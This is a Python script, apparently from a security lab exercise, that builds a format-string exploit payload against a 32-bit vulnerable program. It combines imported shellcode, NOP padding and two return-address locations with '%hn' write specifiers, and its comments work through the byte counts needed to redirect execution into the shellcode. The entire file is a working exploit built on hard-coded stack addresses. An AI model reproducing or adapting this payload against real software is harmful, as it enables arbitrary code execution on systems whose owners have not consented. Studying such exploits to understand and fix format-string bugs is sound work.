#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Reference: https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

VULNERABLE_EBP = 0xfffed298                 # vulnerable %ebp
ADDR_DIFF = 0x808                           # %ebp - buf start address      (2056-byte)
# SHELL_CODE_ADDR = 0xfffeca90              # shell code start address      (buf start address)
SHELL_CODE_ADDR = VULNERABLE_EBP-ADDR_DIFF  # shell code start address      (buf start address)
VULNERABLE_FP_SIZE = 0x04                   # vulnerable frame pointer size (4-byte)
RETURN_ADDR_HIGHER_2_BYTE_ADDR = VULNERABLE_EBP+VULNERABLE_FP_SIZE+2
RETURN_ADDR_LOWER_2_BYTE_ADDR = VULNERABLE_EBP+VULNERABLE_FP_SIZE
PADDING = b'\x90'*1             # pad 1-byte since the size of shell code is 0x17   (23-byte)
                                # shell code size + padding size = 0x18             (24-byte)
'''
shellcode + padding + return_addr lower 2 byte addr + return_addr higher 2 byte addr + b''
b'' %[# of byte offset 0]x%[offset]$hn%[# of byte offset 1]x%[offset+1]$hn

# of byte offset 0 = 0xca90 - shellcode - padding - return_addr lower&higher 2 byte addr
                   = 0xca90 - 0x17 - 0x01 - 0x04 - 0x04
                   = 0xca70 (51824-byte)

# of byte offset 1 = 0xfffe - 0xca90 = 0x356e (13678-byte)

offset = 10             10th argument to printf
offset+1 = 10+1 = 11    11th argument to printf
'''

sys.stdout.buffer.write(shellcode+PADDING+pack('<I',RETURN_ADDR_LOWER_2_BYTE_ADDR)+pack('<I',RETURN_ADDR_HIGHER_2_BYTE_ADDR)+b'%51824x%10$hn%13678x%11$hn')
